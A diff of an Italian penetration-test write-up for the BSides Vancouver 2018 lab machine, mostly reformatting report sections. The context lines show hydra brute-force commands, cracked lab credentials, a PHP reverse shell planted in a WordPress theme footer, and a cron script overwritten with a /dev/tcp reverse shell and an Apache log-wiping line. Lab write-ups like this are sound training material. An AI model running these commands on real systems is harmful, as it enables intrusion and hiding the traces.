@@ -149,7 +149,8 @@ sudo nmap -A -p- 192.168.50.9
 
 ![Users List](IMG/5_users_txt.png)
 
-**Impatto:** Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.
+**Impatto:** 
+- Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.
 
 **Remediation:**
 - Disabilitare l'accesso FTP anonimo
@@ -182,7 +183,7 @@ hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-wo
 
 ![SSH Manual Test](IMG/7_ssh_manual_test.png)
 
-**Risultati:**
+**Analisi:**
 - Solo l'utente **anne** accetta l'autenticazione tramite password, gli altri utenti richiedono autenticazione mediante crittografia asimmetrica
 
 ---
@@ -204,7 +205,8 @@ hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-pass
 - **Username:** anne
 - **Password:** princess
 
-**Impatto:** Compromissione completa dell'account utente tramite password debole.
+**Impatto:** 
+- Compromissione completa dell'account utente tramite password debole.
 
 **Remediation:**
 - Implementare policy di password complesse
@@ -225,10 +227,10 @@ ssh anne@192.168.50.9
 ```
 
 **Risultati:**
-```bash
-anne@bsides2018:~$ whoami
-anne
-```
+- Abbiamo ottenuto l'accesso ad una shell SSH con l'utente **anne**
+
+**Analisi**
+- Possiamo enumerare localmente il sistema target e cercare di elevare i nostri privilegi
 
 ---
 
@@ -251,16 +253,13 @@ User anne may run the following commands on this host:
 ```bash
 anne@bsides2018:~$ sudo /bin/bash
 ```
-
-**Proof of Privilege Escalation:**
-```bash
-root@bsides2018:~# whoami
-root
-```
+**Risultati:**
+- Abbiamo elevato con successo il nostro accesso sulla macchina ottenendo il controllo dell'utente **root**
 
 ![Anne Access and Privilege Escalation](IMG/9_anne_access_and_privesc.png)
 
-**Impatto:** L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'escalation immediata a root.
+**Impatto:** 
+- L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'escalation immediata
 
 **Remediation:**
 - Rimuovere i privilegi sudo dall'utente anne o limitarli a comandi specifici
@@ -313,13 +312,16 @@ Oltre al primo path di attacco tramite SSH, è stato identificato un **secondo v
 nmap -A -p- 192.168.50.9
 ```
 
-**Risultato Chiave - HTTP robots.txt:**
+**Risultati: **
+- Presenza del file robots.txt
 
 ![Nmap Robots.txt Discovery](IMG/11_nmap_vuln_robots.png)
 
-**Analisi:** Il file robots.txt rivela la presenza della directory `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.
+**Analisi:** 
+- Il file robots.txt rivela la presenza della directory `/backup_wordpress`, indicando un'installazione WordPress backup o di test non adeguatamente protetta.
 
-**Impatto:** Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.
+**Impatto:** 
+- Information disclosure che rivela la struttura delle directory e potenziali vettori di attacco.
 
 ![Robots.txt Content](IMG/12_robots_txt.png)
 
@@ -347,7 +349,7 @@ nmap -A -p- 192.168.50.9
 
 **Strumento:** Metasploit Framework
 
-**Module:** `auxiliary/scanner/http/wordpress_login_enum`
+**Modulo:** `auxiliary/scanner/http/wordpress_login_enum`
 
 ![WordPress Login Module](IMG/15_wp_login.png)
 
@@ -360,14 +362,14 @@ msf auxiliary(scanner/http/wordpress_login_enum) > set PASS_FILE /usr/share/secl
 msf auxiliary(scanner/http/wordpress_login_enum) > run
 ```
 
-**Risultati della Detection:**
+**Risultati:**
 ```
 [*] /backup_wordpress - WordPress Version 4.5 detected
 [+] /backup_wordpress - WordPress User-Validation - Username: 'john' - is VALID
 ```
 
-**Risultati Chiave:**
-L'utente **john** è un utente valido e potenziale target per un attacco brute-force mirato
+**Analisi:**
+- L'utente **john** è un utente valido e potenziale target per un attacco brute-force mirato
 
 ---
 
@@ -375,22 +377,7 @@ L'utente **john** è un utente valido e potenziale target per un attacco brute-f
 
 **Strumento:** Metasploit Framework
 
-**Module:** `auxiliary/scanner/http/wordpress_login_enum`
-
-**Username:** john
-
-**Wordlist:** /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
-
-**Esecuzione dell'Attacco:**
-```bash
-msf > search wordpress_login
-
-Matching Modules
-================
-   #  Name                                               Disclosure Date  Rank    Check  Description
-   -  ----                                               ---------------  ----    -----  -----------
-   0  auxiliary/scanner/http/wordpress_login_enum        .                normal  No     WordPress Brute Force and User Enumeration Utility
-```
+**Risultati:**
 
 ![WordPress Password Found](IMG/16_john_password.png)
 
@@ -398,9 +385,10 @@ Matching Modules
 - **Username:** john
 - **Password:** enigma
 
-**Impatto:** Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
+**Impatto:** 
+- Accesso amministrativo completo al pannello WordPress, permettendo l'esecuzione di codice arbitrario.
 
-**Analisi della Vulnerabilità:**
+**Analisi:**
 - Password debole (presente in common wordlist)
 - Nessun rate limiting sui tentativi di login
 - Nessuna protezione contro brute force
@@ -410,7 +398,7 @@ Matching Modules
 
 ### Fase 5: Accesso Pannello Admin WordPress
 
-**Metodo di Accesso:** Web Browser
+**Strumento:** Web Browser
 
 **URL:** http://192.168.50.9/backup_wordpress/wp-login.php
 
@@ -418,36 +406,44 @@ Matching Modules
 
 ![WordPress Login Page](IMG/17_wp_login_php.png)
 
-**Accesso alla Dashboard Admin Confermato:**
+**Risultati:**
+Confermato accesso alla dashboard di amministrazione
 
 ![WordPress Dashboard](IMG/18_wp_dashboard.png)
 
-- Full administrative privileges
-- Access to theme editor
-- Ability to upload files
-- Complete control over WordPress installation
+**Analisi:**
+- Privilegi amministrativi
+- Accesso al Theme Editor
+- Possibilità di caricare file 
+- Controllo completo sull'installazione WordPress
 
 ---
 
 ### Fase 6: Enumerazione Dashboard WordPress
 
-**Risultato Critico:** Theme Editor accessible - permette la modifica diretta di file PHP del tema.
+**Risultati:** 
+Theme Editor accessible
+
+**Analisi:**
+Questa feature permette la modifica diretta di file PHP del tema
 
 ---
 
 ### Fase 7: Accesso Theme Editor per Iniezione Codice
 
+**Strumento:** WordPress Admin Panel
+
 **Navigazione:** Appearance → Editor
 
-**File Target:** Twenty Sixteen: Theme Footer (footer.php)
+**File Target:** Theme Footer (footer.php)
 
-**Theme Editor:**
+**Risultati:**
+- File footer.php modificabile. 
 
 ![WordPress Theme Editor](IMG/19_wp_editor.png)
 
-**Strategia di Exploitation:**
-
-Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog.
+**Analisi:**
+- Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog.
 
 ---
 
@@ -468,9 +464,11 @@ Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni 
 - **Listening Port:** 4444
 - **Shell Type:** /bin/sh interactive shell
 
-Il codice della reverse shell è stato inserito al posto di quello del file footer.php, garantendo l'esecuzione automatica ogni volta che la pagina principale del sito viene caricata.
+**Risultati:**
+- Il codice della reverse shell è stato inserito al posto di quello del file footer.php, garantendo l'esecuzione automatica ogni volta che la pagina principale del sito viene caricata.
 
-**Impatto:** Remote Code Execution (RCE) come utente www-data sul server web.
+**Impatto:** 
+- Remote Code Execution (RCE) come utente www-data sul server web.
 
 ---
 
@@ -483,24 +481,24 @@ Il codice della reverse shell è stato inserito al posto di quello del file foot
 nc -lvnp 4444
 ```
 
-**Configurazione del Listener:**
-```
+**Risultati:**
+```bash
 listening on [any] 4444 ...
 ```
 
-**Listener in ascolto:**
-
-Il listener è in attesa che qualcuno carichi la home del WordPress blog, triggerando l'esecuzione della reverse shell.
+**Analisi:**
+- Il listener è in attesa che qualcuno carichi la home page del WordPress blog, triggerando l'esecuzione della reverse shell
 
 ---
 
 ### Fase 10: Connessione Reverse Shell Stabilita
 
-**Trigger:** Navigazione su qualsiasi pagina WordPress
+**Strumento:** Web Browser
 
 **URL Utilizzato:** http://192.168.50.9/backup_wordpress/
 
-**Connessione Stabilita:**
+**Risultati:**
+- Connessione stabilita
 
 ![Shell Established](IMG/22_shell_established.png)
 
@@ -514,12 +512,13 @@ Il listener è in attesa che qualcuno carichi la home del WordPress blog, trigge
 
 ![Cron Jobs Discovery](IMG/23_cron.png)
 
-**Risultato Critico:**
+**Risultati:**
 ```
 *  *    * * *   root    /usr/local/bin/cleanup
 ```
 
-**Analisi:** Script eseguito **ogni minuto** come **root** e potenziale vettore per privilege escalation
+**Analisi:** 
+- Script eseguito **ogni minuto** come **root** e potenziale vettore per privilege escalation
 
 ---
 
@@ -529,22 +528,12 @@ Il listener è in attesa che qualcuno carichi la home del WordPress blog, trigge
 
 ![Cron Job Permissions](IMG/24_job_permissions.png)
 
-**Risultato Critico:**
-
-**Permessi:** `-rwxrwxrwx` (777)
-- **Owner:** root
-- **Group:** root
-
-**Dettagli della Vulnerabilità:**
+**Risultati:**
 - File eseguito come root ogni minuto via cron
 - Permessi 777 = qualsiasi utente può modificare il file
 
-**Impatto:** Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e ottenere esecuzione di comandi come root.
-
-**Piano di Exploitation:**
-1. Modificare `/usr/local/bin/cleanup` per eseguire una reverse shell
-2. Attendere il prossimo minuto (esecuzione automatica via cron)
-3. Ricevere shell con privilegi root
+**Analisi:** 
+- Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e ottenere esecuzione di comandi come **root**
 
 ---
 
@@ -579,9 +568,8 @@ rm -rf /var/log/apache2/*    # Clean those damn logs!!
 sh -i >& /dev/tcp/192.168.50.5/443 0>&1
 ```
 
-**Timeline di Esecuzione:**
-
-Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root.
+**Analisi:**
+- Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root.
 
 ---
 
